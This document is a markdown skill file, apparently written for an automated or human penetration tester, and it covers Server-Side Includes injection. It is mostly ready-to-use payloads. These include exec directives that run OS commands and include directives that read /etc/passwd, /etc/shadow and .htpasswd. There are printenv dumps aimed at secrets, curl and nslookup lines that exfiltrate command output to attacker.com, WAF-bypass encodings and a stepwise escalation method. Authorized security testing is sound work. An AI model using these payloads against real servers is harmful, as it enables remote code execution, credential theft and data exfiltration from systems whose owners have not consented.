---
name: ssi-injection
description: Server-Side Includes injection for RCE via Apache/Nginx SSI directives in HTML responses
---

# Server-Side Includes (SSI) Injection

SSI injection allows attackers to inject SSI directives into content that the web server processes before sending to the client. When user input is reflected in SSI-enabled files (`.shtml`, `.stm`, `.shtm`) or when SSI is enabled globally, injected directives can execute commands, read files, and exfiltrate data.

## Attack Surface

**Enabled When**
- Apache `mod_include` enabled with `Options +Includes` or `XBitHack`
- Nginx SSI module (`ssi on`) in configuration
- IIS Server Side Includes enabled
- Files with extensions `.shtml`, `.shtm`, `.stm` being served
- CGI/application output processed with SSI (`SSILegacyExprParser`)

**Injection Points**
- User-controlled content included in SSI-processed files
- Error pages (404, 500) that reflect request data
- User profile fields, comments, forum posts rendered in `.shtml` pages
- HTTP headers (User-Agent, Referer) reflected in SSI pages

## Directives Reference

```html
<!--#echo var="DATE_LOCAL" -->           # Current date
<!--#echo var="DOCUMENT_NAME" -->        # Current file
<!--#echo var="HTTP_USER_AGENT" -->      # Request header
<!--#printenv -->                        # Print all env vars
<!--#include file="../../etc/passwd" --> # Local file inclusion
<!--#include virtual="/cgi-bin/test" --> # Execute CGI
<!--#exec cmd="id" -->                   # Execute OS command
<!--#exec cgi="/cgi-bin/test.cgi" -->    # Execute CGI script
<!--#set var="x" value="y" -->          # Set variable
<!--#if expr="$x = y" -->               # Conditional
<!--#config timefmt="%Y" -->            # Configure output format
```

## Key Vulnerabilities

### Command Execution

```html
<!--#exec cmd="id"-->
<!--#exec cmd="cat /etc/passwd"-->
<!--#exec cmd="curl http://attacker.com/?x=`id`"-->
<!--#exec cmd="ls /"-->
<!--#exec cmd="whoami"-->
```

### File Inclusion / Directory Traversal

```html
<!--#include file="../../../../etc/passwd"-->
<!--#include file="/etc/shadow"-->
<!--#include file="../../config/database.yml"-->
<!--#include virtual="/.htpasswd"-->
```

### Environment Variable Disclosure

```html
<!--#printenv-->
<!--#echo var="HTTP_AUTHORIZATION"-->
<!--#echo var="QUERY_STRING"-->
<!--#echo var="SERVER_NAME"-->
<!--#echo var="PATH_TRANSLATED"-->
```

### XSS via SSI

If SSI output is not escaped and returned to client:
```html
<!--#echo var="QUERY_STRING"-->
# URL: ?q=<script>alert(1)</script>
# SSI echoes the raw value → XSS
```

### Blind SSI (No Reflection)

Use OOB techniques:
```html
<!--#exec cmd="curl http://attacker.com/?x=`whoami|base64`"-->
<!--#exec cmd="nslookup `hostname`.attacker.com"-->
```

## Detection

**Probes**
```html
<!--#echo var="DATE_LOCAL"-->     # Returns current date if SSI enabled
<!--#printenv-->                   # Returns env vars
<!--#exec cmd="sleep 5"-->         # Time-based blind detection
```

**Test String Variations**
```
<!--#exec cmd="id"-->
<--#exec cmd="id"-->  (slight variation for WAF bypass)
<!--#exec%20cmd="id"-->
\<!--#exec cmd="id"-->
```

## Bypass Techniques

**HTML Entity Encoding**
```
&lt;!--#exec cmd="id"--&gt;
<!-- Decoded by browser but SSI processes server-side raw content -->
```

**URL Encoding in Request**
```
%3C%21--%23exec%20cmd%3D%22id%22--%3E
```

**Whitespace Variants**
```html
<!--   #exec    cmd = "id"  -->
<!--#exec
cmd="id"-->
```

**Null Byte**
```html
<!--#exec cmd="id"%00-->
```

## Testing Methodology

1. **Identify SSI-enabled pages** — Look for `.shtml`, `.shtm` extensions; check Server headers
2. **Test reflection points** — Find any user input that gets reflected in page content
3. **Inject echo directive** — `<!--#echo var="DATE_LOCAL"-->` — safe, reveals SSI processing
4. **Inject printenv** — `<!--#printenv-->` — dumps environment if SSI enabled
5. **Escalate to exec** — `<!--#exec cmd="id"-->` for RCE
6. **Blind SSI** — Use curl/nslookup OOB if output not reflected
7. **File inclusion** — `<!--#include file="/etc/passwd"-->` for sensitive files

## Validation

1. Demonstrate `<!--#echo var="DATE_LOCAL"-->` renders as date (not literal string)
2. Show `<!--#exec cmd="id"-->` output in response
3. For blind: OAST callback with command output encoded in DNS/HTTP

## False Positives

- SSI disabled (directives returned as literal strings)
- Input sanitized before inclusion in SSI-processed file
- File not processed by SSI handler (wrong extension/config)

## Impact

- Remote code execution as web server user
- Local file disclosure (configuration files, credentials, source code)
- Environment variable exposure (API keys, database credentials)
- SSRF via `virtual` includes to internal services

## Pro Tips

1. `<!--#printenv-->` is lower risk than `cmd` exec — use it first for safer detection
2. Error pages (404/500) are often overlooked injection points for SSI
3. HTTP headers (User-Agent, Referer) reflected in SSI-processed logs are classic vectors
4. CGI scripts called via `virtual` include may have separate injection points
5. Apache's `XBitHack` enables SSI on any world-executable file — check broader config
6. In Docker environments, env vars often contain secrets → `<!--#printenv-->` is high-value

## Summary

SSI injection gives attackers the web server's SSI processing as a code execution engine. Any user-controlled content reflected in SSI-processed pages is vulnerable. Test echo and exec directives on every reflection point, particularly error pages and legacy `.shtml` pages.
